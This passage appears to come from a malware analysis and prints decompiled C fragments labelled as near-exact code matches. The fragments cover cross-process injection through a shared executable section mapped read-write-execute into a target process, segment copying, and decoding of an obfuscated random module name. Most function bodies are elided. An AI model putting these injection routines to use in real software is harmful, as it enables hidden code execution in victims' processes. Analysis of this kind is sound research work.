...
// 100% (C) CODE MATCH
INT32 SharedMapViewOfSection(HANDLE hHandle, SIZE_T iSectionSize,
                             PHANDLE pSectionHandle, PVOID *pBaseAddr1,
                             PVOID *pBaseAddr2) {
  ...
  if (STATUS_SUCCESS !=
      g_hardAddrs.ZwCreateSection(
          pSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize,
          PAGE_EXECUTE_READWRITE, SEC_COMMIT,
          0)) // (..., 0xF001F, 0, ..., 64, 0x8000000, 0)
    return -5;

  iStatus = g_hardAddrs.ZwMapViewOfSection(
      *pSectionHandle, GetCurrentProcess(), pBaseAddr1, 0, 0, 0, &iViewSize,
      ViewShare, 0,
      PAGE_EXECUTE_READWRITE); // (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
  if (iStatus != STATUS_SUCCESS)
    return -5;

  iStatus = g_hardAddrs.ZwMapViewOfSection(
      *pSectionHandle, hHandle, pBaseAddr2, 0, 0, 0, &iViewSize, ViewShare, 0,
      PAGE_EXECUTE_READWRITE); // (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
  if (iStatus != STATUS_SUCCESS)
    return -5;
...
// 99% (C) CODE MATCH
void CopySegmentIntoSections(PVOID *pSharedSection1, PVOID pSharedSection2,
                             INT32 *pSectionPointer,
                             PSECTION_SEGEMENT_INFO sSegment,
                             PVOID pSegmentContent, UINT32 iSegmentSize) {
  if (iSegmentSize)
    __memcpy(*pSharedSection1, pSegmentContent, iSegmentSize);
...
// 100% (C) CODE MATCH
INT32 GetRandomModuleName(GENERAL_INFO_BLOCK *sInfoBlock,
  ...
  if (szDebugLibraryName) {
    if (lstrlenW(szDebugLibraryName) >= 31)
      return -1;
    lstrcpyW(sInfoBlock->RandomLibraryName, szDebugLibraryName);
  } else {
    dwRandom = GetTickCount() + 3 * GetCurrentThreadId();
    DecodeModuleNameW((WCHAR *)ENCODED_KERNEL32_DLL_ASLR__08x,
                      __KERNEL32_DLL_ASLR_08x);
